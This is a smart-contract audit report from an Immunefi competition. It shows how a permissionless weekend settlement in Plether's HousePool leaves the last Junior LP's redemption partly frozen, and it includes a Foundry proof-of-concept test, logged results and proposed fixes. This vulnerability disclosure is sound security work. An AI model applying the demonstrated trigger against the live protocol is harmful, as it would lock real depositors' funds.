# \#98812 [SC-High] A frozen-epoch Senior wind-down credits the 25 bps frozen fee to the permanently locked Senior seed, so the Junior withdrawal covenant traps the last Junior LP's matured redemption with no user-side exit

**Submitted on Nov 10th 2026 at 10:38:50 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98812
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

### Brief/Intro

Each tranche has a seed position (1 USDG at deployment) whose shares are locked forever. The Junior withdrawal covenant requires `juniorPrincipal ≥ SeniorExposure × 2000 / 8000` (80 % cap), so Junior LPs can only exit once Senior exposure goes away.

Suppose the Senior tranche is emptied in a **frozen-FX epoch**, which happens every weekend and can be triggered by anyone. The retained 25 bps frozen fee stays in `seniorPrincipal`. The only Senior holder left is the locked seed, so the seed's principal goes from 1 USDG to ≈ 0.25 % of the exited Senior volume. The seed can never redeem, so this exposure can never leave either. The covenant therefore permanently keeps `E/4` USDG of Junior principal in the pool, and the **last Junior LP** cannot get that part out.

### Vulnerability Details

**1. The frozen fee stays with the remaining Senior holders, which here means only the seed.**

```solidity
// HousePool.sol:1147-1155
function _settlementFeeBps(bool isSenior, bool oracleFrozen) internal view returns (uint256) {
    if (!oracleFrozen) return 0;
@>  return isSenior ? poolConfig.seniorFrozenLpFeeBps : poolConfig.juniorFrozenLpFeeBps; // 25 bps (HousePool.sol:253)
}

// HousePool.sol:857-862 — only the NET funded assets leave seniorPrincipal; the fee stays
HousePoolWaterfallAccountingLib.scaleSeniorOnWithdraw(_getWaterfallState(), seniorPhase.fundedAssets);
```

**2. The seed can never leave.**

```solidity
// TrancheVault.sol:322-323
if (from == seedReceiver && from != address(0) && balanceOf(from) - amount < seedShareFloor) {
    revert TrancheVault__SeedFloorBreached();
}
// TrancheVault.sol:1634-1635 — seed floor is excluded from redeemable shares
```

**3. The Junior covenant counts the seed's inflated exposure as protected Senior exposure.**

```solidity
// HousePool.sol:1209-1216 -> HousePoolSeniorCapacityLib.sol:87-89
uint256 requiredJunior =
@>  _saturatingMulDiv(exposure, BPS - maxSeniorShareBps, maxSeniorShareBps, Math.Rounding.Ceil); // = E / 4
return juniorPrincipal > requiredJunior ? juniorPrincipal - requiredJunior : 0;
```

`_juniorSettlementCapacity` caps the Junior redemption budget with this value (`HousePool.sol:881`). SECURITY.md:1213-1214 lists the cures as "funded Senior redemptions, Junior deposits, or subsequent revenue". The first one becomes impossible, because the seed is never redeemed. The other two depend on third parties: a new Junior depositor inherits the same floor, and revenue only arrives if trading continues. None of them is available to the trapped LP.

**4. The trapped LP has no exit.**
- The matured request is only partially funded and the rest stays queued.
- `cancelRedeemRequest` reverts once the epoch has matured or been partially funded (`TrancheVault.sol:894-896`).
- No refund is given, because a refund only happens when the request has zero value (`HousePool.sol:960-985`).

**5. The trigger is permissionless.** With no open positions, or while the oracle is frozen, anyone can call `settleLpEpoch` (`HousePool.sol:809-818`).

Why this is not a known issue:
- The covenant itself is documented (SECURITY.md:396, :1205-1208).
- Frozen-fee retention is a known Low.
- MED-19 accepts that pending Senior *reservations* can constrain Junior.

None of these covers the case where the fee lands on the **non-redeemable seed**, so that the Senior-redemption cure is gone for good and only third-party or owner action is left.

### Impact Details

- **Frozen amount:** `E × 2000/8000 − juniorSeedValue`, which is ≈ **0.0625 %** of the Senior volume emptied in a frozen epoch:
  - 1M Senior exit: **624.77 USDG** (PoC)
  - 10M: ≈ 6,250 USDG
  - 40M (`maxSeniorExposureAssets`): ≈ 25,000 USDG
- **Duration:** this has no time bound. Waiting, cancelling or re-requesting does not release the funds. Only a third party adding Junior capital (who then inherits the same floor) or the trusted owner can release them, either by raising `maxSeniorShareBps` (72 h timelock) or by `accountExcess`.
- **Value leak while trapped:** the trapped Junior principal keeps paying the 8 % Senior coupon to the protocol-owned seed.
- **Unfair to the last exiter:** whoever exits last bears the whole amount. In the campaign's exit-order differential, this trap was the only source of order dependence: payouts shifted by 61.99 USDG between orders, versus ≤ 100 atoms with frozen fees set to 0.

### Mitigation

- Exclude the seed floor's share of Senior exposure from `juniorWithdrawalRatioCap`, i.e. compute `E` net of `seedShareFloor × seniorPrincipal / seniorSupply`.
- Or, when post-funding Senior supply equals `seedShareFloor`, route the retained frozen fee to Junior or `unassignedAssets` instead of the seed.

### References

- `packages/perps/src/HousePool.sol:253` — `seniorFrozenLpFeeBps = 25`
- `packages/perps/src/HousePool.sol:809-818` — permissionless `settleLpEpoch`
- `packages/perps/src/HousePool.sol:857-862` — net-only `scaleSeniorOnWithdraw`
- `packages/perps/src/HousePool.sol:881` — Junior budget = `_juniorSettlementCapacity`
- `packages/perps/src/HousePool.sol:1147-1155` — `_settlementFeeBps`
- `packages/perps/src/HousePool.sol:1205-1216` — `_juniorSettlementCapacity`
- `packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol:87-89` — `requiredJunior = E·(1−s)/s`
- `packages/perps/src/TrancheVault.sol:322-323`, `:1630-1637` — seed floor lock
- `packages/perps/src/TrancheVault.sol:894-896` — cancel unavailable
- `packages/perps/DEPLOYMENT.md` — release config: seeds 1e6, `maxSeniorShareBps` 8000


## Proof of Concept

## Proof of Concept

Uses only the repo fixture `BasePerpTest` with release parameters. Save as `packages/perps/test/SeedCovenantTrap.t.sol` and run from the repo root:

```
forge test --root packages/perps --match-path test/SeedCovenantTrap.t.sol -vv
```

Flow:
1. 1M Junior and 1M Senior deposit.
2. Senior redeems everything, and anyone settles on Saturday (FX closed).
3. The seed's principal becomes 2,502 USDG.
4. On Monday Junior redeems everything. 624.77 USDG stays queued.
5. Ten more days of settlements change nothing, and cancel reverts.
6. Only a newcomer's deposit releases the funds.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

contract SeedCovenantTrapTest is BasePerpTest {
    address internal constant SEED = address(0x5EED);
    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant JUNIOR_LP = address(0x1E1);
    address internal constant NEWCOMER = address(0x1E2);
    address internal constant ANYONE = address(0xA11);
    uint256 internal constant SATURDAY_NOON = 1_709_985_600; // 2024-03-09 12:00 UTC (FX closed)
    uint256 internal constant MONDAY_0200 = 1_710_122_400; // 2024-03-11 02:00 UTC (FX open)

    // Release parameters: seeds 1 USDG each, Senior cap 40M / 80% (DEPLOYMENT.md)
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _juniorSeedReceiver() internal pure override returns (address) { return SEED; }
    function _seniorSeedReceiver() internal pure override returns (address) { return SEED; }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory c = _currentPoolConfig();
        c.maxSeniorExposureAssets = 40_000_000e6;
        c.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(c);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function _settle() internal {
        vm.warp(((vm.getBlockTimestamp() / 3600) + 2) * 3600 + 60);
        if (!engine.isOracleFrozen()) {
            vm.prank(address(router));
            engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        }
        vm.prank(ANYONE);
        pool.settleLpEpoch(0, 0); // permissionless: no open positions
    }

    function _deposit(TrancheVault v, address lp, uint256 amt) internal returns (uint256 id) {
        settlementToken.mint(lp, amt);
        vm.startPrank(lp);
        settlementToken.approve(address(v), amt);
        id = v.requestDeposit(amt, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(TrancheVault v, address lp, uint256 id) internal {
        uint256 c = v.claimableDepositRequest(id, lp);
        vm.prank(lp);
        v.claimDeposit(id, c, lp, lp);
    }

    function _redeemAll(TrancheVault v, address lp) internal returns (uint256 id) {
        uint256 sh = v.maxRequestRedeem(lp);
        vm.prank(lp);
        id = v.requestRedeem(sh, lp, lp);
    }

    function _claimRedeem(TrancheVault v, address lp, uint256 id) internal returns (uint256 assets) {
        uint256 sh = v.claimableRedeemRequest(id, lp);
        if (sh == 0) return 0;
        vm.prank(lp);
        assets = v.claimRedeem(id, sh, lp, lp);
    }

    function test_LastJuniorLpTrappedBySeedCovenant() public {
        // 1. Two honest LPs: 1M Junior, 1M Senior.
        uint256 jId = _deposit(juniorVault, JUNIOR_LP, 1_000_000e6);
        _settle();
        _claimDeposit(juniorVault, JUNIOR_LP, jId);
        uint256 sId = _deposit(seniorVault, SENIOR_LP, 1_000_000e6);
        _settle();
        _claimDeposit(seniorVault, SENIOR_LP, sId);
        vm.warp(vm.getBlockTimestamp() + 2 hours);

        // 2. Senior exits fully; anyone settles while FX is closed.
        uint256 sRid = _redeemAll(seniorVault, SENIOR_LP);
        vm.warp(SATURDAY_NOON);
        assertTrue(engine.isOracleFrozen(), "weekend frozen");
        vm.prank(ANYONE);
        pool.settleLpEpoch(0, 0);
        uint256 seniorPaid = _claimRedeem(seniorVault, SENIOR_LP, sRid);
        console2.log("senior LP paid", seniorPaid);
        console2.log("senior seed principal after (seed deposited 1 USDG)", pool.seniorPrincipal());
        assertEq(seniorVault.totalSupply(), seniorVault.seedShareFloor(), "only the locked Senior seed remains");
        assertGt(pool.seniorPrincipal(), 2000e6, "25 bps frozen fee accrued entirely to the seed");

        // 3. Market open (no fee). Junior exits fully.
        vm.warp(MONDAY_0200);
        assertFalse(engine.isOracleFrozen(), "market open");
        uint256 jRid = _redeemAll(juniorVault, JUNIOR_LP);
        uint256 jShares = juniorVault.pendingRedeemRequest(jRid, JUNIOR_LP);
        _settle();
        uint256 juniorPaid = _claimRedeem(juniorVault, JUNIOR_LP, jRid);
        uint256 stuck = juniorVault.pendingRedeemRequest(jRid, JUNIOR_LP);
        uint256 required = (pool.seniorPrincipal() * 2000 + 7999) / 8000;
        console2.log("junior LP shares requested", jShares);
        console2.log("junior LP paid", juniorPaid);
        console2.log("junior LP shares still queued", stuck);
        console2.log("junior principal left", pool.juniorPrincipal());
        console2.log("covenant requiredJunior = sP*2000/8000", required);
        assertGt(stuck, 0, "part of the Junior request is unfundable");

        // 4. 10 more daily settlements: still unfundable.
        uint256 valueBefore = (stuck * pool.juniorPrincipal()) / juniorVault.accruedTotalSupply();
        for (uint256 d; d < 10; ++d) {
            vm.warp(vm.getBlockTimestamp() + 1 days);
            if (engine.isOracleFrozen()) continue;
            vm.prank(address(router));
            engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
            vm.prank(ANYONE);
            try pool.settleLpEpoch(0, 0) {} catch {}
            _claimRedeem(juniorVault, JUNIOR_LP, jRid);
        }
        uint256 stuckAfter = juniorVault.pendingRedeemRequest(jRid, JUNIOR_LP);
        uint256 valueAfter = (stuckAfter * pool.juniorPrincipal()) / juniorVault.accruedTotalSupply();
        console2.log("trapped junior value at first settlement", valueBefore);
        console2.log("trapped junior value 10 days later", valueAfter);
        console2.log("senior seed principal 10 days later", pool.seniorPrincipal());
        assertGt(stuckAfter, 0, "still trapped");
        assertGt(valueBefore, 400e6, "hundreds of USDG trapped");

        // Cannot cancel the matured request.
        vm.prank(JUNIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(jRid, JUNIOR_LP, JUNIOR_LP);

        // 5. Only fresh Junior capital releases it (and the newcomer inherits the floor).
        _deposit(juniorVault, NEWCOMER, 10_000e6);
        _settle();
        _settle();
        _claimRedeem(juniorVault, JUNIOR_LP, jRid);
        uint256 stuckCured = juniorVault.pendingRedeemRequest(jRid, JUNIOR_LP);
        console2.log("after newcomer deposit, queued shares", stuckCured);
        assertLt(stuckCured, stuckAfter, "fresh Junior capital releases the trapped LP");
        console2.log("newcomer's own max fundable now (jP - required)",
            pool.juniorPrincipal() - (pool.seniorPrincipal() * 2000 + 7999) / 8000);
    }
}
```

Result:

```
[PASS] test_LastJuniorLpTrappedBySeedCovenant() (gas: 4190002)
Logs:
  senior LP paid 997955327625
  senior seed principal after (seed deposited 1 USDG) 2502142322
  junior LP shares requested 1000675455256843
  junior LP paid 998917851466
  junior LP shares still queued 625473395126
  junior principal left 625764182
  covenant requiredJunior = sP*2000/8000 625764182
  trapped junior value at first settlement 624765314
  trapped junior value 10 days later 624765314
  senior seed principal 10 days later 2503056727
  after newcomer deposit, queued shares 0
  newcomer's own max fundable now (jP - required) 9373788288
```

`juniorPrincipal == requiredJunior` (625.76 USDG): the covenant is binding solely because of the seed's fee-inflated exposure. 624.77 USDG of the Junior LP stays frozen across 10 days, and the request cannot be cancelled.

